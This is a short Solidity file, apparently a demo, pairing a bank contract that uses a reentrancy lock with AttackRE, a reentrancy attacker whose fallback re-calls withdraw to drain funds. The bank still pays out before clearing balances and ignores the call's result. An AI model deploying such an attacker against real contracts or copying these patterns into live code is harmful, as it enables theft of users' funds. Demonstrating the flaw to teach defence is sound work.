pragma solidity ^0.8.15;

contract ReentrancyGuard {
    bool private locked;

    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
}
contract BankSafe {

  mapping(address => uint256) public balances;
bool private locked;

modifier noReentrant() {
    require(!locked, "No reentrancy");
    locked = true;
    _;
    locked = false;
}
  function deposit() public payable {
    balances[msg.sender] += msg.value;}

  function withdraw() public noReentrant{
    require(balances[msg.sender] != 0);
   
    (bool result, ) = msg.sender.call{value: balances[msg.sender]}("");

    balances[msg.sender] = 0; }
    }


contract AttackRE {

    BankSafe public bankSafe;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _bankSafeAdress) {
        bankSafe = BankSafe(_bankSafeAdress);
    }

    fallback() external payable {
        if (address(bankSafe).balance >= AMOUNT) {
            bankSafe.withdraw();
        }
    }
    function attack() external payable {
        require(msg.value >= AMOUNT);
        bankSafe.deposit{value: AMOUNT}();
        bankSafe.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}